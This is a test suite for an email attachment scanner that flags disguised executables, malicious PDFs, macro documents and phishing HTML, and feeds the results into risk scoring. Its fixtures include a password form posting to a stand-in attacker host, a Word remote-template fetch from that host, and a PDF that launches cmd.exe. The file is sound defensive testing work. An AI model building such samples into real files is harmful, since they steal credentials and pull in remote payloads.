"""
Tests for the attachment scanner and its integration into email scoring.
All files are built in memory; nothing is executed or written to disk.
"""

import io
import zipfile

import pytest

from src.features import attachment_scanner as scanner
from src.features.attachment_scanner import scan_attachment, summarize_reports
from src.features.email_features import (
    BASE_WEIGHTS,
    WEIGHTS,
    ATTACHMENT_WEIGHT,
    extract_email_features,
)


def _zip_bytes(members: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        for name, content in members.items():
            zf.writestr(name, content)
    return buf.getvalue()


def _texts(report):
    return ' | '.join(f['text'].lower() for f in report['findings'])


@pytest.fixture(autouse=True)
def _no_virustotal(monkeypatch):
    """Keep tests offline and deterministic unless a test sets its own key."""
    monkeypatch.delenv('VIRUSTOTAL_API_KEY', raising=False)
    scanner._vt_cache.clear()


# ---------------------------------------------------------------- scanner

def test_plain_text_file_has_no_findings():
    r = scan_attachment('notes.txt', b'hello world')
    assert r['risk'] == 0.0
    assert r['verdict'] == 'No issues found'
    assert len(r['sha256']) == 64


def test_executable_extension_is_critical():
    r = scan_attachment('setup.exe', b'MZ' + b'\x00' * 100)
    assert r['risk'] >= 0.9
    assert r['verdict'] == 'High risk'


def test_double_extension_is_critical():
    r = scan_attachment('invoice.pdf.exe', b'MZ' + b'\x00' * 100)
    assert r['risk'] >= 0.9
    assert 'double extension' in _texts(r)


def test_executable_disguised_as_pdf_is_caught_by_magic_bytes():
    r = scan_attachment('invoice.pdf', b'MZ' + b'\x00' * 100)
    assert r['detected_type'] == 'exe'
    assert 'really a windows/linux executable' in _texts(r)
    assert r['risk'] >= 0.9


def test_extension_content_mismatch_is_flagged():
    r = scan_attachment('photo.pdf', b'\x89PNG\r\n\x1a\n' + b'\x00' * 20)
    assert 'looks like' in _texts(r)
    assert 0 < r['risk'] < 0.7


def test_rtl_override_in_filename_is_critical():
    r = scan_attachment('report\u202efdp.exe', b'MZ' + b'\x00' * 20)
    assert 'right-to-left' in _texts(r)


def test_zip_with_executable_inside():
    data = _zip_bytes({'readme.txt': 'hi', 'setup.exe': 'MZ'})
    r = scan_attachment('files.zip', data)
    assert 'archive contains an executable' in _texts(r)
    assert r['risk'] >= 0.9


def test_clean_zip_is_not_flagged():
    data = _zip_bytes({'a.txt': 'one', 'b.txt': 'two'})
    r = scan_attachment('files.zip', data)
    assert r['risk'] == 0.0


def test_pdf_with_javascript_and_open_action():
    pdf = b'%PDF-1.4\n1 0 obj\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj\n%%EOF'
    r = scan_attachment('statement.pdf', pdf)
    text = _texts(r)
    assert 'javascript' in text
    assert 'automatically' in text
    assert r['risk'] >= 0.6


def test_pdf_with_launch_action_is_critical():
    pdf = b'%PDF-1.4\n<< /Type /Action /S /Launch /F (cmd.exe) >>\n%%EOF'
    r = scan_attachment('doc.pdf', pdf)
    assert r['risk'] >= 0.9


def test_html_attachment_with_password_field():
    html = b'<html><form action="http://evil.xyz/p"><input type="password" name="p"></form></html>'
    r = scan_attachment('login.html', html)
    text = _texts(r)
    assert 'password entry field' in text
    assert 'external website' in text
    assert 'http://evil.xyz/p' in r['urls']


def test_office_file_with_macro_project():
    data = _zip_bytes({'[Content_Types].xml': '<x/>', 'word/vbaProject.bin': b'\x00' * 50})
    r = scan_attachment('invoice.docm', data)
    assert 'macro' in _texts(r)
    assert r['risk'] > 0


def test_office_remote_template_injection():
    rels = (
        '<Relationships><Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://evil.xyz/t.dotm" TargetMode="External"/></Relationships>'
    )
    data = _zip_bytes({'[Content_Types].xml': '<x/>', 'word/_rels/settings.xml.rels': rels})
    r = scan_attachment('offer.docx', data)
    assert 'remote content' in _texts(r)
    assert 'http://evil.xyz/t.dotm' in r['urls']


def test_empty_file_is_not_scanned():
    r = scan_attachment('empty.bin', b'')
    assert r['verdict'] == 'Not scanned'


def test_oversized_file_is_not_scanned(monkeypatch):
    monkeypatch.setattr(scanner, 'MAX_ATTACHMENT_BYTES', 10)
    r = scan_attachment('big.bin', b'x' * 50)
    assert r['verdict'] == 'Not scanned'
    assert r['skipped']


# ---------------------------------------------------------------- VirusTotal

class _FakeResp:
    def __init__(self, status, payload=None):
        self.status_code = status
        self._payload = payload or {}

    def json(self):
        return self._payload


def _vt_payload(malicious, suspicious=0, harmless=50, undetected=10):
    return {'data': {'attributes': {'last_analysis_stats': {
        'malicious': malicious, 'suspicious': suspicious,
        'harmless': harmless, 'undetected': undetected}}}}


def test_virustotal_not_called_without_key(monkeypatch):
    def boom(*a, **k):
        raise AssertionError('network must not be used without a key')
    monkeypatch.setattr(scanner.requests, 'get', boom)
    r = scan_attachment('notes.txt', b'hello')
    assert r['vt']['status'] == 'not configured'
    assert r['confirmed_malicious'] is False


def test_virustotal_consensus_marks_confirmed_malicious(monkeypatch):
    monkeypatch.setattr(scanner.requests, 'get', lambda *a, **k: _FakeResp(200, _vt_payload(12)))
    r = scan_attachment('notes.txt', b'hello', vt_api_key='key')
    assert r['confirmed_malicious'] is True
    assert r['risk'] == 1.0
    assert r['verdict'] == 'Malicious'


def test_single_virustotal_detection_is_not_enough(monkeypatch):
    monkeypatch.setattr(scanner.requests, 'get', lambda *a, **k: _FakeResp(200, _vt_payload(1)))
    r = scan_attachment('notes.txt', b'unique-1', vt_api_key='key')
    assert r['confirmed_malicious'] is False
    assert 0 < r['risk'] < 0.7


def test_virustotal_unknown_hash_is_not_treated_as_safe_or_bad(monkeypatch):
    monkeypatch.setattr(scanner.requests, 'get', lambda *a, **k: _FakeResp(404))
    r = scan_attachment('notes.txt', b'unique-2', vt_api_key='key')
    assert r['vt']['status'] == 'not found'
    assert r['confirmed_malicious'] is False
    assert r['risk'] == 0.0


def test_virustotal_rate_limit_is_handled(monkeypatch):
    monkeypatch.setattr(scanner.requests, 'get', lambda *a, **k: _FakeResp(429))
    r = scan_attachment('notes.txt', b'unique-3', vt_api_key='key')
    assert r['vt']['status'] == 'rate limited'
    assert r['risk'] == 0.0


# ---------------------------------------------------------------- scoring

BASE_EMAIL = {
    'subject': 'Your invoice',
    'sender': '',
    'claimed_org': '',
    'body': 'Please see the attached invoice.',
}


def test_weights_sum_to_one_with_seven_categories():
    assert abs(sum(WEIGHTS.values()) - 1.0) < 1e-9
    assert len(WEIGHTS) == 7
    assert WEIGHTS['attachment_risk'] == ATTACHMENT_WEIGHT
    assert abs(sum(BASE_WEIGHTS.values()) - 1.0) < 1e-9


def test_email_without_attachments_has_no_attachment_category():
    feats = extract_email_features(dict(BASE_EMAIL))
    keys = [b['feature'] for b in feats['breakdown']]
    assert 'attachment_risk' not in keys
    assert len(keys) == 6
    assert abs(sum(b['weight'] for b in feats['breakdown']) - 1.0) < 1e-9


def test_email_with_attachment_adds_seventh_category_and_rebalances():
    report = scan_attachment('invoice.pdf.exe', b'MZ' + b'\x00' * 50)
    feats = extract_email_features({**BASE_EMAIL, 'attachment_reports': [report]})
    keys = [b['feature'] for b in feats['breakdown']]
    assert 'attachment_risk' in keys
    assert len(keys) == 7
    assert abs(sum(b['weight'] for b in feats['breakdown']) - 1.0) < 1e-9
    att = next(b for b in feats['breakdown'] if b['feature'] == 'attachment_risk')
    assert att['strength'] >= 0.9
    assert att['contribution'] > 10


def test_dangerous_attachment_raises_score_versus_no_attachment():
    without = extract_email_features(dict(BASE_EMAIL))['email_risk_score']
    report = scan_attachment('invoice.pdf.exe', b'MZ' + b'\x00' * 50)
    with_att = extract_email_features({**BASE_EMAIL, 'attachment_reports': [report]})['email_risk_score']
    assert with_att > without


def test_clean_attachment_adds_zero_points():
    report = scan_attachment('notes.txt', b'hello')
    feats = extract_email_features({**BASE_EMAIL, 'attachment_reports': [report]})
    att = next(b for b in feats['breakdown'] if b['feature'] == 'attachment_risk')
    assert att['contribution'] == 0
    assert 'no issues found' in att['reason'].lower()


def test_summarize_reports_handles_empty_and_skipped():
    assert summarize_reports([])['count'] == 0
    s = summarize_reports([{'skipped': 'too big', 'risk': 0.0}])
    assert s['count'] == 1 and s['scanned'] == 0


def test_confirmed_malicious_attachment_forces_score_to_95():
    from src.api.main import analyze_email, EmailRequest
    req = EmailRequest(
        subject='Hello', sender='', claimed_org='', body='Hi there.',
        attachment_reports=[{
            'filename': 'x.bin', 'risk': 1.0, 'verdict': 'Malicious', 'confirmed_malicious': True,
            'findings': [{'severity': 'critical', 'text': 'VirusTotal: 12 of 70 flag this file'}],
        }],
    )
    data = analyze_email(req)
    assert data['risk_score'] >= 95.0
    assert data['is_suspicious'] is True
    assert data['reasons'][0]['rule'] == 'Attachment Confirmed Malicious'


def test_scan_attachments_endpoint_round_trip():
    import base64
    from src.api.main import scan_attachments, AttachmentScanRequest, AttachmentUpload
    payload = AttachmentScanRequest(files=[
        AttachmentUpload(filename='invoice.pdf.exe', content_type='application/octet-stream',
                         data_b64=base64.b64encode(b'MZ' + b'\x00' * 50).decode()),
    ])
    out = scan_attachments(payload)
    assert out['reports'][0]['risk'] >= 0.9
    assert out['reports'][0]['sha256']
